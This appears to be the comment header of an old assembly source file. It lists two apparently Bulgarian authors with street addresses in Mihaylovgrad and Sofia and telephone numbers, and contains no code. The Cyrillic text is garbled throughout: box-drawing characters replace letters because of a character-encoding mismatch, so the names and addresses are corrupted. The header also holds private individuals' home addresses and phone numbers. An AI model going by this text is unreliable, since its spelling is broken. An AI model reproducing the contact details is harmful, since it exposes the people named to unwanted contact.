;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;	Яни Л╛боми░ов Б░анков , Ми╡айловг░ад  │л."Г.Дам┐нов"  6
;			  , ▓ел.2-13-34
;	Л╛боми░ Ма▓еев Ма▓еев , Со┤и┐  │л."Б│дапе╣а" 14
;			  , ▓ел.80-28-26
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
